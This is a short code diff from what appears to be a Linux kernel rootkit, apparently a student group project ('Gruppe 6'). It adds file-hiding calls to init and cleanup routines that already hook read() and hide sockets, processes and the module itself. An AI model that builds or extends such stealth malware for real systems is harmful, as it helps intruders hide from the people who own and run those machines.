@@ -35,6 +35,9 @@ static int __init _init_module(void)
     hook_read(handle_input);
     load_sockethiding();
     load_processhiding();
+    // needed to initialize the whole file hiding thingy
+    hide_files();
+    unhide_files();
     return 0;
 }
 
@@ -49,6 +52,8 @@ static void __exit _cleanup_module(void)
     unhide_module();
     OUR_DEBUG("Unhooking read...\n");
     unhook_read();
+    OUR_DEBUG("Unhooking file hiding...\n");
+    unhide_files();
     OUR_DEBUG("Gruppe 6 says goodbye.\n");
     clear_commands();
 }
